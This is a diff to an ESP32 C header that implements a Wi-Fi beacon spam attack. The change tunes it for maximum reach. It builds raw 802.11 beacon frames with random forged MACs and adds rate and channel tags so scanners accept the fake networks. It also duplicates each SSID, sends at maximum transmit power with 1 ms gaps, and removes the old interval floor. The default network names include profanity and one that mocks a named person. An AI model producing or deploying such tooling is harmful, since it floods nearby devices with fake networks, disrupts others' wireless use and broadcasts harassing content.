@@ -1,4 +1,4 @@
-// wifi_spam.h - Beacon Spam Attack (Configurable)
+// wifi_spam.h - Beacon Spam Attack (Max Visibility)
 #ifndef WIFI_SPAM_H
 #define WIFI_SPAM_H
 
@@ -13,38 +13,38 @@
 #include "freertos/task.h"
 
 #define MAX_CUSTOM_SSIDS 500
+#define MAX_BEACON_ENTRIES 200  // Max unique beacons (SSID+MAC pairs)
 
 static const char *SPAM_TAG = "WiFi_Spam";
 static uint8_t spam_running = 0;
 static TaskHandle_t spam_task_handle = NULL;
 
-// Configuration structure
 typedef struct {
-    uint8_t tx_power;               // 8-84 (2dBm - 21dBm)
-    uint16_t beacon_interval;       // ms between beacons
-    uint8_t random_macs;            // 1=random, 0=fixed
-    uint8_t use_custom_list;        // 1=custom, 0=default
-    uint8_t burst_count;            // Beacons per SSID (1-5)
-    uint8_t simultaneous_networks;  // Networks to show at once (0=all)
-    uint16_t rotation_seconds;      // Rotate batches every N seconds (0=disabled)
+    uint8_t tx_power;           // 8-84 (2dBm - 21dBm)
+    uint16_t beacon_interval;   // ms between full cycles
+    uint8_t per_ssid_delay;     // ms between individual beacons (lower = faster)
+    uint8_t burst_count;        // Times to send each beacon per cycle
+    uint8_t duplicates;         // Extra copies of each SSID with different MACs (1-10)
+    uint8_t use_custom_list;    // 1=custom, 0=default
+    uint8_t randomize_order;    // Shuffle send order each cycle
 } SpamConfig;
 
 static SpamConfig spam_config = {
-    .tx_power = 84,                 // Max power (21dBm)
-    .beacon_interval = 30,          // Fast interval
-    .random_macs = 1,               // Random MACs
-    .use_custom_list = 0,           // Default list
-    .burst_count = 3,               // 3 beacons per SSID
-    .simultaneous_networks = 10,    // Show 10 at once
-    .rotation_seconds = 45          // Rotate every 45s
+    .tx_power = 84,
+    .beacon_interval = 10,     // 10ms between full cycles
+    .per_ssid_delay = 1,       // 1ms between beacons
+    .burst_count = 2,          // 2 bursts per beacon
+    .duplicates = 3,           // 3 copies per SSID = 60 visible networks with defaults
+    .use_custom_list = 0,
+    .randomize_order = 1,
 };
 
-// Default funny SSID templates
+// Default SSIDs
 static const char *default_ssids[] = {
     "Fuck ICE",
     "I'm like 90% sure no one likes Mrs. Edwards",
     "NSA Listening Post",
-    "The Glowies Are Everyevere",
+    "The Glowies Are Everywhere",
     "Theres no limit to the larp",
     "Martin Router King",
     "I'm not funny",
@@ -65,187 +65,186 @@ static const char *default_ssids[] = {
 
 #define NUM_DEFAULT_SSIDS (sizeof(default_ssids) / sizeof(default_ssids[0]))
 
-// Custom SSID list (user-configurable)
 static char custom_ssids[MAX_CUSTOM_SSIDS][33];
 static uint8_t custom_ssid_count = 0;
 
-// Custom beacon frame structure
+// Pre-computed beacon entry: SSID + fixed MAC pair
 typedef struct {
-    uint8_t frame_ctrl[2];
-    uint8_t duration[2];
-    uint8_t destination[6];
-    uint8_t source[6];
-    uint8_t bssid[6];
-    uint8_t seq_ctrl[2];
-    uint8_t timestamp[8];
-    uint8_t beacon_interval[2];
-    uint8_t capability[2];
-    uint8_t tag_ssid;
-    uint8_t tag_ssid_len;
-    uint8_t ssid[32];
-} __attribute__((packed)) beacon_frame_t;
+    char ssid[33];
+    uint8_t mac[6];
+} BeaconEntry;
 
-// Send raw beacon frame
-static void send_beacon(const char *ssid) {
-    beacon_frame_t beacon = {0};
-    
-    // Frame Control: Type=Management, Subtype=Beacon
-    beacon.frame_ctrl[0] = 0x80;
-    beacon.frame_ctrl[1] = 0x00;
-    
-    // Duration
-    beacon.duration[0] = 0x00;
-    beacon.duration[1] = 0x00;
-    
-    // Destination: Broadcast
-    memset(beacon.destination, 0xFF, 6);
-    
-    // Source & BSSID: Random or fixed MAC
-    if (spam_config.random_macs) {
-        esp_fill_random(beacon.source, 6);
-        beacon.source[0] = (beacon.source[0] & 0xFE) | 0x02;
-    } else {
-        static uint8_t base_mac[6] = {0x02, 0xCA, 0xFE, 0x00, 0x00, 0x00};
-        static uint8_t mac_counter = 0;
-        memcpy(beacon.source, base_mac, 6);
-        beacon.source[5] = mac_counter++;
-    }
-    memcpy(beacon.bssid, beacon.source, 6);
-    
-    // Sequence control
-    static uint16_t seq_num = 0;
-    beacon.seq_ctrl[0] = (seq_num & 0x0F) << 4;
-    beacon.seq_ctrl[1] = (seq_num & 0x0FF0) >> 4;
-    seq_num++;
-    
-    // Timestamp
-    uint64_t timestamp = esp_timer_get_time();
-    memcpy(beacon.timestamp, &timestamp, 8);
-    
-    // Beacon interval (100 TUs)
-    beacon.beacon_interval[0] = 0x64;
-    beacon.beacon_interval[1] = 0x00;
-    
-    // Capability: ESS
-    beacon.capability[0] = 0x01;
-    beacon.capability[1] = 0x00;
-    
-    // SSID Tag
-    beacon.tag_ssid = 0x00;
-    size_t ssid_len = strlen(ssid);
-    if (ssid_len > 32) ssid_len = 32;
-    beacon.tag_ssid_len = ssid_len;
-    memcpy(beacon.ssid, ssid, ssid_len);
-    
-    size_t packet_size = sizeof(beacon_frame_t) - (32 - ssid_len);
-    esp_wifi_80211_tx(WIFI_IF_AP, &beacon, packet_size, false);
-}
+static BeaconEntry beacon_entries[MAX_BEACON_ENTRIES];
+static uint16_t beacon_entry_count = 0;
 
-// Smart spam task with burst + rotation
-static void spam_task(void *param) {
+// Build beacon table: each SSID gets `duplicates` entries with unique MACs
+static void spam_build_beacon_table(void) {
     const char **ssid_list;
-    uint8_t total_ssid_count;
-    
-    // Select SSID list
+    uint8_t ssid_count;
+
     if (spam_config.use_custom_list && custom_ssid_count > 0) {
         ssid_list = (const char **)custom_ssids;
-        total_ssid_count = custom_ssid_count;
+        ssid_count = custom_ssid_count;
     } else {
         ssid_list = default_ssids;
-        total_ssid_count = NUM_DEFAULT_SSIDS;
+        ssid_count = NUM_DEFAULT_SSIDS;
     }
-    
-    // Determine active network count
-    uint8_t active_count = spam_config.simultaneous_networks;
-    if (active_count == 0 || active_count > total_ssid_count) {
-        active_count = total_ssid_count; // Show all
+
+    beacon_entry_count = 0;
+    uint8_t dups = spam_config.duplicates;
+    if (dups < 1) dups = 1;
+    if (dups > 10) dups = 10;
+
+    for (uint8_t i = 0; i < ssid_count && beacon_entry_count < MAX_BEACON_ENTRIES; i++) {
+        for (uint8_t d = 0; d < dups && beacon_entry_count < MAX_BEACON_ENTRIES; d++) {
+            BeaconEntry *e = &beacon_entries[beacon_entry_count];
+            strncpy(e->ssid, ssid_list[i], 32);
+            e->ssid[32] = '\0';
+
+            // Unique MAC per entry, locally administered unicast
+            esp_fill_random(e->mac, 6);
+            e->mac[0] = (e->mac[0] & 0xFE) | 0x02;
+
+            beacon_entry_count++;
+        }
     }
-    
-    uint8_t rotation_offset = 0;
-    uint32_t last_rotation = xTaskGetTickCount();
-    uint8_t ssid_index = 0;
-    
-    ESP_LOGI(SPAM_TAG, "Smart spam: %d total, %d active, burst=%d, interval=%dms, rotate=%ds", 
-             total_ssid_count, active_count, spam_config.burst_count, 
-             spam_config.beacon_interval, spam_config.rotation_seconds);
-    
+
+    ESP_LOGI(SPAM_TAG, "Built %d beacon entries (%d SSIDs x %d duplicates)",
+             beacon_entry_count, ssid_count, dups);
+}
+
+// Fisher-Yates shuffle
+static void spam_shuffle_entries(void) {
+    for (uint16_t i = beacon_entry_count - 1; i > 0; i--) {
+        uint16_t j = esp_random() % (i + 1);
+        BeaconEntry tmp = beacon_entries[i];
+        beacon_entries[i] = beacon_entries[j];
+        beacon_entries[j] = tmp;
+    }
+}
+
+// Send a single beacon frame with proper tags so scanners pick it up
+static void send_beacon(const char *ssid, const uint8_t *mac) {
+    uint8_t packet[128];
+    uint16_t pos = 0;
+
+    // MAC header (24 bytes)
+    packet[pos++] = 0x80; packet[pos++] = 0x00; // Frame Control: Beacon
+    packet[pos++] = 0x00; packet[pos++] = 0x00; // Duration
+    memset(&packet[pos], 0xFF, 6); pos += 6;     // Destination: broadcast
+    memcpy(&packet[pos], mac, 6); pos += 6;      // Source
+    memcpy(&packet[pos], mac, 6); pos += 6;      // BSSID
+    static uint16_t seq = 0;
+    packet[pos++] = (seq & 0x0F) << 4;
+    packet[pos++] = (seq >> 4) & 0xFF;
+    seq++;
+
+    // Fixed parameters (12 bytes)
+    uint64_t ts = esp_timer_get_time();
+    memcpy(&packet[pos], &ts, 8); pos += 8;
+    packet[pos++] = 0x64; packet[pos++] = 0x00; // Beacon interval 100 TU
+    packet[pos++] = 0x21; packet[pos++] = 0x04; // Capability: ESS + short preamble
+
+    // SSID tag
+    size_t ssid_len = strlen(ssid);
+    if (ssid_len > 32) ssid_len = 32;
+    packet[pos++] = 0x00;
+    packet[pos++] = ssid_len;
+    memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;
+
+    // Supported Rates (makes scanners treat it as real)
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x08;
+    packet[pos++] = 0x82; packet[pos++] = 0x84;
+    packet[pos++] = 0x8B; packet[pos++] = 0x96;
+    packet[pos++] = 0x24; packet[pos++] = 0x30;
+    packet[pos++] = 0x48; packet[pos++] = 0x6C;
+
+    // DS Parameter Set (channel)
+    packet[pos++] = 0x03;
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x06;
+
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, false);
+}
+
+// Main spam task - blasts all beacons as fast as possible
+static void spam_task(void *param) {
+    spam_build_beacon_table();
+
+    ESP_LOGI(SPAM_TAG, "Spam started: %d beacons, burst=%d, delay=%dms",
+             beacon_entry_count, spam_config.burst_count, spam_config.per_ssid_delay);
+
     while (spam_running) {
-        // Check rotation
-        if (spam_config.rotation_seconds > 0 && active_count < total_ssid_count) {
-            uint32_t now = xTaskGetTickCount();
-            if ((now - last_rotation) > pdMS_TO_TICKS(spam_config.rotation_seconds * 1000)) {
-                rotation_offset = (rotation_offset + active_count) % total_ssid_count;
-                last_rotation = now;
-                ESP_LOGI(SPAM_TAG, "Rotating to networks %d-%d", 
-                         rotation_offset, (rotation_offset + active_count - 1) % total_ssid_count);
+        if (spam_config.randomize_order) {
+            spam_shuffle_entries();
+        }
+
+        for (uint16_t i = 0; i < beacon_entry_count && spam_running; i++) {
+            BeaconEntry *e = &beacon_entries[i];
+
+            for (uint8_t b = 0; b < spam_config.burst_count; b++) {
+                send_beacon(e->ssid, e->mac);
+                if (b < spam_config.burst_count - 1) {
+                    vTaskDelay(pdMS_TO_TICKS(1));
+                }
+            }
+
+            if (spam_config.per_ssid_delay > 0) {
+                vTaskDelay(pdMS_TO_TICKS(spam_config.per_ssid_delay));
+            } else {
+                taskYIELD();
             }
         }
-        
-        // Calculate actual SSID index
-        uint8_t actual_index = (rotation_offset + ssid_index) % total_ssid_count;
-        
-        // Burst transmission
-        for (uint8_t burst = 0; burst < spam_config.burst_count; burst++) {
-            send_beacon(ssid_list[actual_index]);
-            if (burst < spam_config.burst_count - 1) {
-                vTaskDelay(pdMS_TO_TICKS(8)); // 8ms between bursts
-            }
+
+        if (spam_config.beacon_interval > 0) {
+            vTaskDelay(pdMS_TO_TICKS(spam_config.beacon_interval));
         }
-        
-        // Next SSID in active batch
-        ssid_index = (ssid_index + 1) % active_count;
-        
-        // Main interval delay
-        vTaskDelay(pdMS_TO_TICKS(spam_config.beacon_interval));
     }
-    
-    ESP_LOGI(SPAM_TAG, "Beacon spam stopped");
+
+    ESP_LOGI(SPAM_TAG, "Spam task stopped");
     spam_task_handle = NULL;
     vTaskDelete(NULL);
 }
 
-// Get current config
+// --- Public API ---
+
 static inline SpamConfig* spam_get_config(void) {
     return &spam_config;
 }
 
-// Set TX power (8-84)
 static inline void spam_set_tx_power(uint8_t power) {
     if (power < 8) power = 8;
     if (power > 84) power = 84;
     spam_config.tx_power = power;
+    if (spam_running) esp_wifi_set_max_tx_power(power);
 }
 
-// Set beacon interval (ms)
 static inline void spam_set_interval(uint16_t interval_ms) {
-    if (interval_ms < 20) interval_ms = 20;
     if (interval_ms > 1000) interval_ms = 1000;
     spam_config.beacon_interval = interval_ms;
 }
 
-// Set burst count
+static inline void spam_set_per_ssid_delay(uint8_t delay_ms) {
+    spam_config.per_ssid_delay = delay_ms;
+}
+
 static inline void spam_set_burst(uint8_t burst) {
     if (burst < 1) burst = 1;
-    if (burst > 5) burst = 5;
+    if (burst > 10) burst = 10;
     spam_config.burst_count = burst;
 }
 
-// Set simultaneous networks
-static inline void spam_set_simultaneous(uint8_t count) {
-    spam_config.simultaneous_networks = count; // 0 = all
+static inline void spam_set_duplicates(uint8_t dups) {
+    if (dups < 1) dups = 1;
+    if (dups > 10) dups = 10;
+    spam_config.duplicates = dups;
 }
 
-// Set rotation seconds
-static inline void spam_set_rotation(uint16_t seconds) {
-    spam_config.rotation_seconds = seconds; // 0 = disabled
-}
-
-// Toggle random MACs
 static inline void spam_set_random_macs(uint8_t enable) {
-    spam_config.random_macs = enable;
+    spam_config.randomize_order = enable;
 }
 
-// Add custom SSID
 static inline uint8_t spam_add_custom_ssid(const char *ssid) {
     if (custom_ssid_count >= MAX_CUSTOM_SSIDS) return 0;
     strncpy(custom_ssids[custom_ssid_count], ssid, 32);
@@ -254,67 +253,84 @@ static inline uint8_t spam_add_custom_ssid(const char *ssid) {
     return 1;
 }
 
-// Clear custom SSID list
 static inline void spam_clear_custom_ssids(void) {
     custom_ssid_count = 0;
 }
 
-// Use custom list
 static inline void spam_use_custom_list(uint8_t enable) {
     spam_config.use_custom_list = enable;
 }
 
-// Get SSID count
 static inline uint8_t spam_get_ssid_count(void) {
     return spam_config.use_custom_list ? custom_ssid_count : NUM_DEFAULT_SSIDS;
 }
 
-// Start beacon spam
+static inline uint16_t spam_get_beacon_count(void) {
+    return beacon_entry_count;
+}
+
+static inline void spam_rebuild(void) {
+    spam_build_beacon_table();
+}
+
 static inline uint8_t spam_start(void) {
     if (spam_running) return 0;
     if (spam_config.use_custom_list && custom_ssid_count == 0) return 0;
-    
+
     static uint8_t wifi_init_done = 0;
     if (!wifi_init_done) {
         ESP_ERROR_CHECK(esp_netif_init());
         ESP_ERROR_CHECK(esp_event_loop_create_default());
-        
+
         wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
         ESP_ERROR_CHECK(esp_wifi_init(&cfg));
         ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+
+        wifi_config_t ap_cfg = {0};
+        ap_cfg.ap.channel = 6;
+        ap_cfg.ap.max_connection = 0;
+        ap_cfg.ap.ssid_hidden = 1;
+        ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+        ap_cfg.ap.ssid[0] = '\0';
+        ap_cfg.ap.ssid_len = 0;
+        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));
+
         ESP_ERROR_CHECK(esp_wifi_start());
-        ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(spam_config.tx_power));
-        
         wifi_init_done = 1;
-    } else {
-        esp_wifi_set_max_tx_power(spam_config.tx_power);
     }
-    
+
+    esp_wifi_set_max_tx_power(spam_config.tx_power);
     spam_running = 1;
-    
+
     BaseType_t result = xTaskCreate(spam_task, "spam_task", 4096, NULL, 5, &spam_task_handle);
     if (result != pdPASS) {
         spam_running = 0;
         return 0;
     }
-    
+
     return 1;
 }
 
-// Stop beacon spam
 static inline void spam_stop(void) {
     if (!spam_running) return;
     spam_running = 0;
-    uint8_t wait_count = 0;
-    while (spam_task_handle != NULL && wait_count < 50) {
+    uint8_t wait = 0;
+    while (spam_task_handle != NULL && wait < 50) {
         vTaskDelay(pdMS_TO_TICKS(100));
-        wait_count++;
+        wait++;
     }
 }
 
-// Check if spam is running
 static inline uint8_t spam_is_running(void) {
     return spam_running;
+}
+
+// Legacy compat stubs
+static inline void spam_set_simultaneous(uint8_t count) {
+    (void)count;
+}
+static inline void spam_set_rotation(uint16_t seconds) {
+    (void)seconds;
 }
 
 #endif
